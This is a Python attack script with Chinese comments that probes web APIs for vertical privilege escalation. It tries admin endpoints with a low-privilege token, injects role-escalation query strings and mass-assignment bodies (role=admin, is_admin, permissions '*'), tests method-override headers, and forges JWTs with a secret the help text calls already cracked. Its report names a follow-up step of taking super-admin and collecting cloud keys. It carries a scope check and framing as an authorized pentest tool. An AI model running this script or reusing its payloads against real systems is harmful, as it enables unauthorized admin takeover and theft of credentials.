#!/usr/bin/env python3
"""RBAC / BFLA 垂直越权探针（授权范围内）。

默认只 GET：管理读 + /me + JWT TTL 判定。
--jwt-secret：本地重签枚举 ver/version/v/jti（0..5），不撤权、不改密。
不发 Override DELETE、不空 POST 集合、不删他人。
--method-probe：只打假 id 的方法矩阵（仍不删真用户）。
--write：只建/清本轮标记号，禁止 DELETE --other-id。
"""
from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import re
import sys
import time
from datetime import datetime, UTC
from pathlib import Path
from typing import Any
from urllib.parse import urljoin

try:
    import requests
    requests.packages.urllib3.disable_warnings()  # type: ignore
except ImportError:
    print("[!] pip install requests", file=sys.stderr)
    sys.exit(1)

OPS = Path(__file__).resolve().parent
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))
from scope_lib import host_of, in_scope, write_probe_json  # noqa: E402

UA = "Mozilla/5.0 大爱仙尊-rbac-bypass"
FAKE_ID = "__se_rbac_noexist__"

ADMIN_QUICK = (
    "/api/v1/users",
    "/api/admin/users",
    "/api/admin/user/list",
    "/admin-api/system/user/page",
    "/prod-api/system/user/list",
    "/api/system/user/list",
    "/admin/users",
    "/proxy/list",
    "/admin/login-logs",
)
VERSION_CLAIM_KEYS = ("ver", "version", "v", "token_version", "tv")
HS_HASH = {
    "HS256": hashlib.sha256,
    "HS384": hashlib.sha384,
    "HS512": hashlib.sha512,
}
ADMIN_FULL = ADMIN_QUICK + (
    "/api/v1/tenants",
    "/api/v1/services",
    "/api/v1/roles",
    "/api/users",
    "/api/role/list",
    "/api/roles",
    "/admin/users",
)
PROFILE_QUICK = (
    "/api/v1/users/me",
    "/api/users/me",
    "/api/user/info",
    "/api/profile",
)
PROFILE_FULL = PROFILE_QUICK + (
    "/user/profile",
    "/api/v1/users/me/permissions",
    "/api/users/me/permissions",
    "/api/getInfo",
    "/prod-api/getInfo",
)

ROLE_KEYS = {
    "role", "roles", "role_id", "roleid", "role_in_tenant",
    "authority", "authorityid", "is_admin", "isadmin", "admin",
    "super_admin", "permissions", "perms",
}
USER_ROW_KEYS = {
    "email", "username", "userid", "user_id", "uid", "mobile",
    "phone", "nickname", "account", "role", "roles",
}
ELEVATED = {
    "admin", "super_admin", "superadmin", "owner", "root",
    "administrator", "888", "1",
}
DENY_HINTS = (
    "unauthorized", "forbidden", "insufficient permission",
    "无权限", "权限不足", "没有权限", "未登录", "not authenticated",
)
OK_CODES = {0, 200, "0", "200", True, "ok", "success", "OK"}
DENY_CODES = {401, 403, 40100, 40300, "401", "403", "40100", "40300"}


def _mask_secret(s: str, keep: int = 8) -> str:
    s = (s or "").strip()
    if len(s) <= keep:
        return "***"
    return s[:keep] + "…"


def _strip_token(tok: str) -> str:
    t = (tok or "").strip()
    if t.lower().startswith("bearer "):
        t = t[7:].strip()
    return t


def _b64url_decode(part: str) -> bytes:
    pad = "=" * (-len(part) % 4)
    return base64.urlsafe_b64decode(part + pad)


def _decode_jwt(tok: str) -> dict[str, Any]:
    tok = _strip_token(tok)
    out: dict[str, Any] = {"masked": _mask_secret(tok, 16), "alg": "", "claims_keys": []}
    parts = tok.split(".")
    if len(parts) < 2:
        return out
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        out["alg"] = str(header.get("alg") or "")
        if isinstance(payload, dict):
            out["claims_keys"] = sorted(str(k) for k in payload.keys())[:40]
            for k in ("role", "roles", "authority", "permissions", "scope", "sub", "username",
                      *VERSION_CLAIM_KEYS, "jti"):
                if k in payload:
                    out[f"claim_{k}"] = str(payload[k])[:120]
            exp, iat = payload.get("exp"), payload.get("iat")
            now = int(time.time())
            if isinstance(exp, (int, float)):
                out["exp"] = int(exp)
                out["ttl_left_sec"] = int(exp) - now
                out["expired"] = int(exp) <= now
            if isinstance(iat, (int, float)) and isinstance(exp, (int, float)):
                out["token_ttl_sec"] = int(exp) - int(iat)
    except Exception as e:
        out["decode_error"] = str(e)[:80]
    return out


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _hs_sign(header: dict[str, Any], payload: dict[str, Any], secret: str) -> str:
    alg = str(header.get("alg") or "HS256").upper()
    hfn = HS_HASH.get(alg, hashlib.sha256)
    hdr = {**header, "alg": alg if alg in HS_HASH else "HS256", "typ": header.get("typ") or "JWT"}
    p1 = _b64url(json.dumps(hdr, separators=(",", ":"), ensure_ascii=False).encode())
    p2 = _b64url(json.dumps(payload, separators=(",", ":"), ensure_ascii=False).encode())
    sig = hmac.new(secret.encode("utf-8"), f"{p1}.{p2}".encode("ascii"), hfn).digest()
    return f"{p1}.{p2}.{_b64url(sig)}"


def _jwt_parts(tok: str) -> tuple[dict[str, Any], dict[str, Any]] | None:
    tok = _strip_token(tok)
    parts = tok.split(".")
    if len(parts) < 2:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
    except Exception:
        return None
    if not isinstance(header, dict) or not isinstance(payload, dict):
        return None
    return header, payload


def _parse_header_args(items: list[str]) -> dict[str, str]:
    out: dict[str, str] = {}
    for raw in items or []:
        if ":" not in raw:
            continue
        k, v = raw.split(":", 1)
        if k.strip():
            out[k.strip()] = v.strip()
    return out


def _headers(token: str, cookie: str, extra: dict[str, str] | None = None) -> dict[str, str]:
    h = {"User-Agent": UA, "Accept": "application/json, */*"}
    tok = _strip_token(token)
    if tok:
        h["Authorization"] = f"Bearer {tok}"
    if cookie:
        h["Cookie"] = cookie.strip()
    if extra:
        h.update(extra)
    return h


def _snip(text: str, n: int = 180) -> str:
    return re.sub(r"\s+", " ", (text or "")[:n]).strip()


def _loads(text: str) -> Any:
    try:
        return json.loads(text)
    except Exception:
        return None


def _biz_denied(text: str, status: int | None = None) -> bool:
    if status in (401, 403):
        return True
    low = (text or "").lower()
    if any(x in low for x in DENY_HINTS):
        return True
    data = _loads(text)
    if not isinstance(data, dict):
        return False
    code = data.get("code", data.get("errcode", data.get("status")))
    if code in DENY_CODES:
        return True
    msg = str(data.get("msg") or data.get("message") or data.get("error") or "")
    if any(x in msg for x in ("无权限", "权限不足", "没有权限", "Unauthorized", "Forbidden")):
        return True
    if data.get("success") is False and code not in OK_CODES:
        return True
    return False


def _unwrap_rows(data: Any) -> list[Any]:
    if isinstance(data, list):
        return data
    if not isinstance(data, dict):
        return []
    for key in ("rows", "records", "list", "items", "users"):
        val = data.get(key)
        if isinstance(val, list):
            return val
    inner = data.get("data")
    if isinstance(inner, list):
        return inner
    if isinstance(inner, dict):
        for key in ("rows", "records", "list", "items", "users"):
            val = inner.get(key)
            if isinstance(val, list):
                return val
    return []


def _looks_user_row(obj: Any) -> bool:
    if not isinstance(obj, dict):
        return False
    keys = {str(k).lower() for k in obj}
    return bool(keys & USER_ROW_KEYS)


def _page_total(data: Any) -> int:
    if not isinstance(data, dict):
        return 0
    for key in ("total", "count", "totalCount"):
        v = data.get(key)
        if isinstance(v, (int, float)) and v > 0:
            return int(v)
    inner = data.get("data")
    if isinstance(inner, dict):
        for key in ("total", "count", "totalCount"):
            v = inner.get(key)
            if isinstance(v, (int, float)) and v > 0:
                return int(v)
    return 0


def _has_admin_shape(text: str, status: int | None = None) -> bool:
    """他人列表/分页才算管理面。单条 /me 不算。"""
    if not text or _biz_denied(text, status):
        return False
    data = _loads(text)
    if data is None:
        return False
    rows = _unwrap_rows(data)
    n_user = sum(1 for x in rows if _looks_user_row(x))
    if n_user >= 2:
        return True
    if n_user == 1 and _page_total(data) > 1:
        return True
    return False


def _role_view(data: Any, depth: int = 0) -> dict[str, str]:
    out: dict[str, str] = {}
    if depth > 3 or data is None:
        return out
    if isinstance(data, dict):
        for k, v in data.items():
            lk = str(k).lower()
            if lk in ROLE_KEYS and not isinstance(v, (dict, list)):
                out[lk] = str(v)[:80]
            elif lk in ROLE_KEYS and isinstance(v, list) and v and not isinstance(v[0], (dict, list)):
                out[lk] = ",".join(str(x) for x in v[:8])
            else:
                out.update(_role_view(v, depth + 1))
    elif isinstance(data, list) and data:
        out.update(_role_view(data[0], depth + 1))
    return out


def _elevated_change(before: dict[str, str], after: dict[str, str]) -> list[str]:
    hits: list[str] = []
    for k, av in after.items():
        bv = before.get(k, "")
        if av == bv:
            continue
        low = av.lower()
        if any(e in low for e in ELEVATED) or (k in {"is_admin", "isadmin", "admin"} and low in {"true", "1", "yes"}):
            hits.append(f"{k}:{bv!r}->{av!r}")
    return hits


def _abs(base: str, prefix: str, path: str) -> str:
    if path.startswith("http"):
        return path
    p = path if path.startswith("/") else "/" + path
    pre = (prefix or "").strip()
    if pre:
        if not pre.startswith("/"):
            pre = "/" + pre
        pre = pre.rstrip("/")
        if p == pre or p.startswith(pre + "/"):
            joined = p
        else:
            joined = pre + p
    else:
        joined = p
    return urljoin(base.rstrip("/") + "/", joined.lstrip("/"))


def _req(
    sess: requests.Session,
    method: str,
    url: str,
    headers: dict[str, str],
    *,
    json_body: Any = None,
    timeout: float = 12,
) -> dict[str, Any]:
    row: dict[str, Any] = {"method": method, "url": url, "error": ""}
    try:
        resp = sess.request(
            method,
            url,
            headers=headers,
            json=json_body,
            timeout=timeout,
            verify=False,
            allow_redirects=False,
        )
    except Exception as e:
        row["error"] = str(e)[:120]
        return row
    body = resp.text or ""
    status = resp.status_code
    denied = _biz_denied(body, status)
    row.update(
        {
            "status": status,
            "size": len(body),
            "denied": denied,
            "admin_shape": _has_admin_shape(body, status),
            "role_view": _role_view(_loads(body)),
            "snip": _snip(body),
        }
    )
    return row


def _load_paths(path: str) -> list[str]:
    if not path:
        return []
    out: list[str] = []
    for ln in Path(path).read_text(encoding="utf-8").splitlines():
        s = ln.strip()
        if not s or s.startswith("#"):
            continue
        out.append(s)
    return out


def _classify_read(user: dict[str, Any], anon: dict[str, Any]) -> dict[str, Any]:
    """BFLA vs 未鉴权 vs 拒绝。"""
    if user.get("admin_shape") and not user.get("denied"):
        if anon.get("admin_shape") and not anon.get("denied"):
            return {"level": "L2", "signal": "unauth-admin-read", "next": "authz-probe 未鉴权面"}
        return {"level": "L2", "signal": "bfla-admin-read"}
    snip = (user.get("snip") or "").lstrip()
    if (
        user.get("status") in (200, 201)
        and not user.get("denied")
        and (user.get("size") or 0) > 20
        and snip[:1] in "{["
    ):
        return {"level": "L1", "signal": "admin-path-alive"}
    return {"level": "", "signal": "denied-or-empty"}


def run(args: argparse.Namespace) -> dict[str, Any]:
    host = host_of(args.base)
    if not host or not in_scope(host):
        print(f"[!] 不在 scope：{host or args.base}", file=sys.stderr)
        sys.exit(2)
    if not args.token and not args.cookie and not args.header:
        print("[!] 需要 --token / --cookie / --header（低权身份）", file=sys.stderr)
        sys.exit(2)

    token = _strip_token(args.token)
    extra = _parse_header_args(args.header)
    base = args.base.rstrip("/")
    prefix = args.prefix or ""
    timeout = float(args.timeout)

    sess = requests.Session()
    if args.proxy:
        sess.proxies = {"http": args.proxy, "https": args.proxy}

    findings: list[dict[str, Any]] = []
    probed: list[dict[str, Any]] = []
    jwt_info = _decode_jwt(token) if token and token.count(".") >= 2 else {}
    if jwt_info.get("expired"):
        print("[!] JWT 已过期：后续 401 不算 RBAC 拒绝，切 jwt_gql_probe", file=sys.stderr)

    admin_paths = list(ADMIN_FULL if args.full else ADMIN_QUICK)
    admin_paths = list(dict.fromkeys([*(args.admin_path or []), *admin_paths, *_load_paths(args.paths_file)]))
    profile_paths = list(PROFILE_FULL if args.full else PROFILE_QUICK)
    profile_paths = list(dict.fromkeys([*(args.profile_path or []), *profile_paths]))

    auth = _headers(token, args.cookie, extra)
    anon = _headers("", "", None)

    # --- 场景 1：只读管理面 ---
    first_denied_admin = ""
    for path in admin_paths:
        url = _abs(base, prefix, path)
        user = _req(sess, "GET", url, auth, timeout=timeout)
        nobody = _req(sess, "GET", url, anon, timeout=timeout)
        cls = _classify_read(user, nobody)
        row = {
            "scene": "direct",
            "path": path,
            "status": user.get("status"),
            "anon_status": nobody.get("status"),
            "denied": user.get("denied"),
            "admin_shape": user.get("admin_shape"),
            "snip": user.get("snip"),
            **cls,
        }
        probed.append(row)
        if cls["level"]:
            findings.append(row)
            print(f"  {cls['level']} {cls['signal']} GET {path} status={user.get('status')} anon={nobody.get('status')}")
        if user.get("denied") and not first_denied_admin:
            first_denied_admin = path
        time.sleep(0.1)

    # --- 场景 2：权限面 + query 注入后再打一条曾 403 的管理读 ---
    if jwt_info:
        findings.append(
            {
                "scene": "inherit",
                "level": "L1",
                "signal": "jwt-claims",
                **jwt_info,
                "note": "TTL 内旧角色仍有效（未改 claim）是预期；过期仍 200 才报洞；撤权后枚举 ver/version/v/jti（1..5）五次内复活才报",
            }
        )
    inject_q = "role=admin&authorityId=888&roles=admin&role_in_tenant=owner"
    for path in profile_paths:
        url = _abs(base, prefix, path)
        got = _req(sess, "GET", url, auth, timeout=timeout)
        got.update({"scene": "inherit", "path": path, "signal": "profile-or-perm", "level": "L1"})
        if got.get("status") and got["status"] < 400 and not got.get("denied"):
            findings.append(
                {
                    "scene": "inherit",
                    "path": path,
                    "status": got.get("status"),
                    "signal": "profile-or-perm",
                    "level": "L1",
                    "role_view": got.get("role_view"),
                    "snip": got.get("snip"),
                }
            )
            qurl = url + ("&" if "?" in url else "?") + inject_q
            inj = _req(sess, "GET", qurl, auth, timeout=timeout)
            if inj.get("admin_shape") and not got.get("admin_shape"):
                inj.update({"scene": "inherit", "path": path, "level": "L2", "signal": "role-query-inject"})
                findings.append(inj)
                print(f"  L2 role-query {path}")
            if first_denied_admin:
                retry = _req(sess, "GET", _abs(base, prefix, first_denied_admin) + ("&" if "?" in first_denied_admin else "?") + inject_q, auth, timeout=timeout)
                if retry.get("admin_shape") and not retry.get("denied"):
                    retry.update({"scene": "inherit", "path": first_denied_admin, "level": "L2", "signal": "role-query-unlock-admin"})
                    findings.append(retry)
                    print(f"  L2 role-query unlock {first_denied_admin}")
                    first_denied_admin = ""
        time.sleep(0.08)

    # --- 场景 3：假 id 方法矩阵（默认关；不碰真用户）---
    if args.method_probe:
        sample = list(dict.fromkeys([*(args.admin_path or []), *admin_paths]))[:4]
        for path in sample:
            fake = path.rstrip("/") + "/" + FAKE_ID
            url = _abs(base, prefix, fake)
            matrix: dict[str, Any] = {"scene": "method", "path": fake}
            base_post = _req(sess, "POST", url, auth, json_body={}, timeout=timeout)
            matrix["POST"] = {"status": base_post.get("status"), "denied": base_post.get("denied")}
            for method in ("GET", "OPTIONS", "PATCH", "PUT"):
                alt = _req(sess, method, url, auth, json_body={} if method in ("PATCH", "PUT") else None, timeout=timeout)
                matrix[method] = {"status": alt.get("status"), "denied": alt.get("denied"), "admin_shape": alt.get("admin_shape")}
                if alt.get("admin_shape") and method == "GET":
                    findings.append({"scene": "method", "path": fake, "level": "L2", "signal": "bfla-get-on-write-id", "status": alt.get("status")})
            for hdr, val in (
                ("X-HTTP-Method-Override", "DELETE"),
                ("X-Method-Override", "DELETE"),
                ("X-HTTP-Method", "DELETE"),
            ):
                ov = _req(sess, "POST", url, _headers(token, args.cookie, {**extra, hdr: val}), json_body={}, timeout=timeout)
                matrix[hdr] = {"status": ov.get("status"), "denied": ov.get("denied")}
                # 假 id：Override 与 POST 差分只作 L1 线索，200+业务成功才抬 L2
                if (
                    ov.get("status") not in (None, 401, 403, 404, 405)
                    and ov.get("status") != base_post.get("status")
                    and ov.get("admin_shape")
                ):
                    findings.append(
                        {
                            "scene": "method",
                            "path": fake,
                            "level": "L2",
                            "signal": "method-override-diff",
                            "override": f"{hdr}:{val}",
                            "post_status": base_post.get("status"),
                            "status": ov.get("status"),
                        }
                    )
                    print(f"  L2 override {hdr} {fake}")
            findings.append({"scene": "method", "level": "L1", "signal": "method-matrix", **matrix})
            time.sleep(0.08)

    # --- 场景 4：/me 字段，前后角色差分 ---
    inject_body = {
        "role": "admin",
        "roles": ["admin"],
        "role_id": 1,
        "roleId": 1,
        "role_in_tenant": "owner",
        "authorityId": 888,
        "is_admin": True,
        "isAdmin": True,
        "admin": True,
        "super_admin": True,
        "permissions": ["*"],
        "created_at": "2020-01-01T00:00:00Z",
    }
    for path in profile_paths:
        url = _abs(base, prefix, path)
        before = _req(sess, "GET", url, auth, timeout=timeout)
        # 默认只 PATCH（部分更新）。PUT 整对象替换会清空资料，须 --write。
        patch = _req(sess, "PATCH", url, auth, json_body=inject_body, timeout=timeout)
        put: dict[str, Any] = {}
        if args.write:
            put = _req(sess, "PUT", url, auth, json_body=inject_body, timeout=timeout)
        after = _req(sess, "GET", url, auth, timeout=timeout)
        changed = _elevated_change(before.get("role_view") or {}, after.get("role_view") or {})
        row = {
            "scene": "param",
            "path": path,
            "before": before.get("role_view"),
            "after": after.get("role_view"),
            "put_status": put.get("status"),
            "patch_status": patch.get("status"),
            "changed": changed,
        }
        if changed:
            row.update({"level": "L3", "signal": "mass-assign-role"})
            findings.append(row)
            print(f"  L3 mass-assign {path} {changed}")
        elif (patch.get("status") in (200, 201) and not patch.get("denied")) or (
            put.get("status") in (200, 201) and not put.get("denied")
        ):
            row.update({"level": "L1", "signal": "profile-write-accepted-echo-only"})
            findings.append(row)
        time.sleep(0.1)

    if args.self_id and args.other_id:
        # 只 POST 探测体，绝不 DELETE 他人
        body = {"ids": [args.self_id, args.other_id], "se_rbac_probe": True}
        for path in list(dict.fromkeys([*(args.admin_path or []), *admin_paths]))[:4]:
            url = _abs(base, prefix, path)
            hit = _req(sess, "POST", url, auth, json_body=body, timeout=timeout)
            hit.update({"scene": "param", "path": path, "signal": "batch-ids-probe", "write": False})
            if hit.get("admin_shape") and not hit.get("denied"):
                hit["level"] = "L2"
                findings.append(hit)
                print(f"  L2 batch-read {path}")
            time.sleep(0.08)

    # --- 场景 5 ---
    if jwt_info:
        expired = bool(jwt_info.get("expired"))
        still_admin = any(f.get("signal") == "bfla-admin-read" for f in findings)
        verdict = "PASS-expected-if-revoked-but-unexpired"
        if expired and still_admin:
            verdict = "FAIL-expired-token-still-admin"
        elif expired and not still_admin:
            verdict = "expired-token-cannot-judge-rbac"
        findings.append(
            {
                "scene": "stale-jwt",
                "level": "L2" if verdict.startswith("FAIL") else "L1",
                "signal": "jwt-stale-judge",
                "expired": expired,
                "ttl_left_sec": jwt_info.get("ttl_left_sec"),
                "token_ttl_sec": jwt_info.get("token_ttl_sec"),
                "verdict": verdict,
                "note": "撤权后未过期仍可用（未改 claim）= 预期；过期仍管理 200 才切 JWT 卡；version/jti 枚举见 --jwt-secret",
            }
        )
        if args.jwt_secret and token and not expired:
            probe_path = first_denied_admin or (admin_paths[0] if admin_paths else "/admin/users")
            parts = _jwt_parts(token)
            if parts:
                header, payload = parts
                key = next((k for k in VERSION_CLAIM_KEYS if k in payload), "version")
                accepted: list[str] = []
                for n in range(6):
                    p = dict(payload)
                    p[key] = n
                    forged = _hs_sign(header, p, args.jwt_secret)
                    hit = _req(
                        sess,
                        "GET",
                        _abs(base, prefix, probe_path),
                        _headers(forged, args.cookie, extra),
                        timeout=timeout,
                    )
                    ok = bool(hit.get("admin_shape")) and not hit.get("denied")
                    if ok:
                        accepted.append(f"{key}={n}")
                    time.sleep(0.05)
                if len(accepted) >= 2:
                    findings.append(
                        {
                            "scene": "stale-jwt",
                            "level": "L2",
                            "signal": "jwt-version-enum-bypass",
                            "path": probe_path,
                            "accepted": accepted[:6],
                            "note": "多 version 重签均能读管理面=吊销可预测；TTL 内原票不算洞",
                        }
                    )
                    print(f"  L2 version-enum {probe_path} accepted={accepted}")
                else:
                    findings.append(
                        {
                            "scene": "stale-jwt",
                            "level": "L1",
                            "signal": "jwt-version-enum-tried",
                            "path": probe_path,
                            "accepted": accepted,
                            "note": "未撤权下仅当前 version 有效属预期；撤权后再枚举 1..5 才报 H003",
                        }
                    )

    marker = None
    if args.write:
        email = f"se-rbac-{int(time.time())}@example.invalid"
        create_path = (args.admin_path or ["/api/v1/users"])[0]
        create_url = _abs(base, prefix, create_path)
        created = _req(
            sess,
            "POST",
            create_url,
            auth,
            json_body={"email": email, "password": "SeRbacProbe1!", "username": email.split("@")[0]},
            timeout=timeout,
        )
        created.update({"scene": "direct", "signal": "write-create-marker", "marker_email": email, "path": create_path})
        marker_id = ""
        data = _loads(created.get("snip") or "")
        if isinstance(data, dict):
            for k in ("id", "userId", "user_id", "uid"):
                if data.get(k):
                    marker_id = str(data[k])
                    break
            inner = data.get("data")
            if not marker_id and isinstance(inner, dict):
                for k in ("id", "userId", "user_id", "uid"):
                    if inner.get(k):
                        marker_id = str(inner[k])
                        break
        if created.get("status") in (200, 201) and not created.get("denied"):
            created["level"] = "L3"
            print(f"  L3 create-marker {create_path} id={marker_id or '?'}")
        findings.append(created)
        cleaned = None
        if marker_id:
            cleaned = _req(sess, "DELETE", create_url.rstrip("/") + "/" + marker_id, auth, timeout=timeout)
        marker = {"email": email, "id": marker_id, "create": created, "cleanup": cleaned}

    levels = {f.get("level") for f in findings if f.get("level")}
    level = "L3" if "L3" in levels else "L2" if "L2" in levels else "L1" if (findings or probed) else "none"
    report = {
        "target": base,
        "prefix": prefix,
        "ts": datetime.now(UTC).isoformat(),
        "level": level,
        "jwt": jwt_info,
        "write": bool(args.write),
        "method_probe": bool(args.method_probe),
        "marker": marker,
        "probed": probed,
        "finding_count": len(findings),
        "findings": findings,
        "playbook": "传承/无极·职分.md",
        "next": (
            "L2/L3 → 回填对象矩阵配置/角色格；进超管收云钥。"
            "unauth-admin-read → authz-probe。"
            "阴性 → object_matrix next，勿写复工。"
            "过期票仍管理 200 → jwt_gql_probe。"
            "jwt-version-enum-bypass → 吊销可预测，不是 TTL 误报。"
        ),
    }
    out_path = write_probe_json(
        report,
        case=args.case,
        out=args.out,
        case_subdir="rbac",
        filename="surface.json",
    )
    print(json.dumps({"level": level, "findings": len(findings), "probed": len(probed), "out": str(out_path)}, ensure_ascii=False))
    print(f"[+] wrote {out_path}", file=sys.stderr)
    return report


def main() -> None:
    ap = argparse.ArgumentParser(description="RBAC / BFLA 垂直越权探针（默认只读）")
    ap.add_argument("--base", required=True, help="授权站 origin")
    ap.add_argument("--prefix", default="", help="网关前缀，如 /prod-api、/admin-api")
    ap.add_argument("--token", default="", help="低权 Bearer；可带或不带 Bearer 前缀")
    ap.add_argument("--cookie", default="", help="低权 Cookie")
    ap.add_argument("--header", action="append", default=[], help="额外头，可重复：X-Token:…")
    ap.add_argument("--proxy", default="", help="HTTP/SOCKS 代理 URL")
    ap.add_argument("--case", default="")
    ap.add_argument("--out", type=Path, default=None)
    ap.add_argument("--admin-path", action="append", default=[], help="可重复；管理端点")
    ap.add_argument("--profile-path", action="append", default=[], help="可重复；/me 或权限接口")
    ap.add_argument("--paths-file", default="", help="每行一个 path，# 开头跳过")
    ap.add_argument("--self-id", default="", help="批量探测：自己的资源 id（不删）")
    ap.add_argument("--other-id", default="", help="批量探测：他人资源 id（不删）")
    ap.add_argument("--full", action="store_true", help="加长默认 path 表")
    ap.add_argument("--method-probe", action="store_true", help="假 id 上打 OPTIONS/Override，不碰真用户")
    ap.add_argument("--timeout", type=float, default=12)
    ap.add_argument(
        "--jwt-secret",
        default="",
        help="已撞开的 HS256 钥；仅本地重签枚举 version 0..5，不撤权",
    )
    ap.add_argument(
        "--write",
        action="store_true",
        help="允许 POST 标记用户并 DELETE 该标记；禁止删已有/他人",
    )
    args = ap.parse_args()
    run(args)


if __name__ == "__main__":
    main()
